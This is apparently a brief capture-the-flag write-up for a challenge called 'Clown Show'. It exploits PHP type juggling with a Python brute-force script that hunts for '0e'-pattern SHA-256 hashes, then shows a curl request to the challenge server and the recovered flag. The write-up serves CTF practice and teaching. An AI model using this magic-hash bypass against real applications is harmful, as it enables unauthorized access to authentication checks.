# Clown Show

/src.php has src

kinda piss type juggling so basic bruteforce

```py
import hashlib

def hash(string):
    return hashlib.sha256(string).hexdigest()

time = b"12345678901"
name = b"test"
import os, binascii
import re
while True:
    answer = binascii.hexlify(os.urandom(20))
    thing = hash(name + answer + time)
    if len(re.findall('^(.{5}0e[\d]{18})', thing)) > 0:
        print(re.findall('^.....0e\d{18}', thing))
        print(name + b" " + answer + b" " + time)
        print(thing)
        exit()
```
curl http://challenge.ctf.games:31965/index.php -d 'name=test&answer=6b067ebdb712e42e64e6dcaeb6513afd0f801bfc&time=12345678901'

#### Flag:flag{w00t_W0ot_juggl1n6_1s_2_3z}
